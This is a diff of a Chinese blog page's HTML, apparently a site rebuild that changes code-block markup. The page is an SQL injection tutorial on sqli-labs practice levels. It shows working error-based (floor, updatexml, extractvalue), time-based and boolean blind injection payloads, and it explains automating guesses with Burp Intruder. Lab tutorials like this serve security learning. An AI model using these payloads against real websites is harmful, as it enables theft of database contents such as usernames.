-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((select (column_name) from information_schema.columns where table_schema=database() and table_name= &#x27;users&#x27; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from (select count(*),concat((select (column_name) from information_schema.columns where table_schema=database() and table_name= &#x27;users&#x27; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/7.png" alt="1646481042045"></p>
 <ol start="4">
 <li>爆字段数据</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((select username from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select 1 from (select count(*),concat((select username from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+<br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/8.png" alt="1646481199468"></p>
 <ul>
@@ -570,23 +572,23 @@
 <p><strong>xpath语法错误，通过爆语法错误，顺便第二个参数里面的参数类容也爆出来，只要让第二个参数不符合xpath语法就可以报错</strong></p>
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1646536236587.png" alt="1646536236587"></p>
 <p> <strong>updatexml：</strong> </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(&quot;~&quot;,(database())),0)--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and updatexml(1,concat(&quot;~&quot;,(database())),0)--+<br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/9.png" alt="1646534166611"></p>
 <p>获取表：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x7e),1))--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),0x7e),1))--+<br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1646536736551.png" alt="1646536736551"></p>
 <p>列，字段，数据….省略</p>
 <p><strong>extractvalue：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(null,concat(0x7e,(select user()),0x7e));--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and extractvalue(null,concat(0x7e,(select user()),0x7e));--+<br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/1660.png" alt="1646534259127"></p>
-<h3 id="延迟盲注"><a href="#延迟盲注" class="headerlink" title="延迟盲注"></a><strong>延迟盲注</strong></h3><p>判断目标是否真的存在注入点，我们可以加单引号，双引号，减号 等干扰字符来确定输入的参数是否能代入数据库中，但是如果不管输入什么不管怎么闭合，前端页面都是显示正常，那么这时候时间盲注应运而生</p>
+<h3><span id="延迟盲注"><strong>延迟盲注</strong></span></h3><p>判断目标是否真的存在注入点，我们可以加单引号，双引号，减号 等干扰字符来确定输入的参数是否能代入数据库中，但是如果不管输入什么不管怎么闭合，前端页面都是显示正常，那么这时候时间盲注应运而生</p>
 <p>来到sqlilabs的第九关，当我们在url上输入任何参数返回页面都返回正常</p>
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/62611.png" alt="1646459336591"></p>
 <p>时间盲注的利用过程</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(1=1,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and if(1=1,sleep(5),1)--+<br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/212.png" alt="1646459863671"></p>
 <ol start="2">
@@ -594,10 +596,10 @@
 <p>通过ASCII函数来判断</p>
 </li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if ((ascii(mid((select version()),1,1))=53),sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and if ((ascii(mid((select version()),1,1))=53),sleep(5),1)--+<br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/214.png" alt="1646467884085"></p>
-<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h3><p>目标网站即使存在注入，即使存在注入，也没有任何的回显，不管怎样改变参数，有么就是页面没有变化，要么就是页面啥也没有，对于这种情况，我们可以通过布尔盲注要么返回要么不返回的两种状态的改变来判断我们想要的结果</p>
+<h3><span id="布尔盲注"><strong>布尔盲注</strong></span></h3><p>目标网站即使存在注入，即使存在注入，也没有任何的回显，不管怎样改变参数，有么就是页面没有变化，要么就是页面啥也没有，对于这种情况，我们可以通过布尔盲注要么返回要么不返回的两种状态的改变来判断我们想要的结果</p>
 <p>例如：语句是被带入到数据库执行，但是在页面上看不到任何的信息</p>
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/115.png" alt="1646236190924"></p>
 <p><strong>开始注入演示</strong>：</p>
@@ -623,12 +625,12 @@
 </ol>
 <ul>
 <li><p>判断表的数量：count,information_schema</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from information_schema.tables where table_schema=database())=4--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select count(*) from information_schema.tables where table_schema=database())=4--+<br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/3618.png" alt="1646283281839"></p>
 </li>
 <li><p>获取表名字的长度</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=5--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=5--+<br></code></pre></td></tr></table></figure>
 
 <p><strong>注意：这里的limit 0,1排序是从0开始的</strong></p>
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/12320.png" alt="1646284501803"></p>
@@ -639,7 +641,7 @@
 </li>
 </ul>
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/2521.png" alt="1646285143209"></p>
-<h3 id="Burp获取表名信息"><a href="#Burp获取表名信息" class="headerlink" title="Burp获取表名信息"></a>Burp获取表名信息</h3><p>在实际的 WEB渗透中如果目标存在布尔注入，我们在url地址上一个个的测试是非常的麻烦，效率很低的。，所以使用<strong>Burp</strong>的<strong>Intruder</strong>来猜解信息是一个不错的选择</p>
+<h3><span id="burp获取表名信息">Burp获取表名信息</span></h3><p>在实际的 WEB渗透中如果目标存在布尔注入，我们在url地址上一个个的测试是非常的麻烦，效率很低的。，所以使用<strong>Burp</strong>的<strong>Intruder</strong>来猜解信息是一个不错的选择</p>
 <p>使用Burp获取表名：</p>
 <ol>
 <li>先抓一个包，然后发送给给Intruder模块</li>
@@ -670,52 +672,52 @@
 <ul>
 <li>获取列名</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select count(column_name)  from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=3--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select count(column_name)  from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)=3--+<br><br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/28.png" alt="1646391486413"></p>
 <ul>
 <li>获取列名长度</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select  length(column_name)  from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1)=2--+</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-8</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select  length(column_name)  from information_schema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1)=2--+</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/30.png" alt="1646391728435"></p>
 <ul>
 <li>获取列名名称</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select  ascii(substr(column_name,1,1))  from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1)=105--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and (select  ascii(substr(column_name,1,1))  from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1)=105--+<br><br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/31.png" alt="1646392542559"></p>
 <ul>
 <li>获取字段长度</li>
 </ul>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> length(id) <span class="keyword">from</span> users limit <span class="number">12</span>,<span class="number">1</span>) <span class="operator">=</span><span class="number">2</span><span class="comment">--+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> length(id) <span class="hljs-keyword">from</span> users limit <span class="hljs-number">12</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/32.png" alt="1646393476820"></p>
 <ul>
 <li>获取字段名</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select username from users limit 0,1),1,1))=68--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">and ascii(substr((select username from users limit 0,1),1,1))=68--+<br><br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/33.png" alt="1646458321889"></p>
 <p><strong>重点：</strong></p>
 <p><strong>通过查询方式与网站应用得关系注入点产生地方或应用猜测对方查询方式</strong></p>
 <p><strong>例如下方的注册页面，对应的就是插入语句 insert</strong> </p>
 <p><img src="/../../images/SQL%E6%B3%A8%E5%85%A5/34.png" alt="1646154063954"></p>
-<h3 id="SQL注入—报错盲注"><a href="#SQL注入—报错盲注" class="headerlink" title="SQL注入—报错盲注"></a>SQL注入—报错盲注</h3><p>​        盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行半段或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">基于布尔的SQL盲注-逻辑判断（优先级：2）</span><br><span class="line"></span><br><span class="line">regexp,like,ascii,left,ord,mid</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3><span id="sql注入报错盲注">SQL注入—报错盲注</span></h3><p>​        盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行半段或者尝试，这个过程称之为盲注。我们可以知道盲注分为以下三类：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">基于布尔的SQL盲注-逻辑判断（优先级：2）<br><br>regexp,like,ascii,left,ord,mid<br><br></code></pre></td></tr></table></figure>
 
 
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">基于时间的SQL盲注-延时判断（优先级：3）</span><br><span class="line"></span><br><span class="line">if,sleep</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">基于时间的SQL盲注-延时判断（优先级：3）<br><br>if,sleep<br><br></code></pre></td></tr></table></figure>
 
 
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">基于报错的SQL盲注-报错回显（优先级：1）</span><br><span class="line"></span><br><span class="line">floor，updatexml，extractvalue</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">基于报错的SQL盲注-报错回显（优先级：1）<br><br>floor，updatexml，extractvalue<br><br></code></pre></td></tr></table></figure>
 
 
 
-<h3 id="12种报错注入-万能语句"><a href="#12种报错注入-万能语句" class="headerlink" title="12种报错注入+万能语句"></a>12种报错注入+万能语句</h3><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
-<h3 id="Access偏移注入"><a href="#Access偏移注入" class="headerlink" title="Access偏移注入"></a><strong>Access偏移注入</strong></h3><p>如果遇到列名猜解不到的情况，则可以使用Access偏移注入</p>
+<h3><span id="12种报错注入万能语句">12种报错注入+万能语句</span></h3><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
+<h3><span id="access偏移注入"><strong>Access偏移注入</strong></span></h3><p>如果遇到列名猜解不到的情况，则可以使用Access偏移注入</p>
 <ol>
 <li>原理</li>
 </ol>
@@ -784,6 +786,18 @@
 
     
 </div>
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
 		
 <link rel="stylesheet" href="/css/food.css">
 
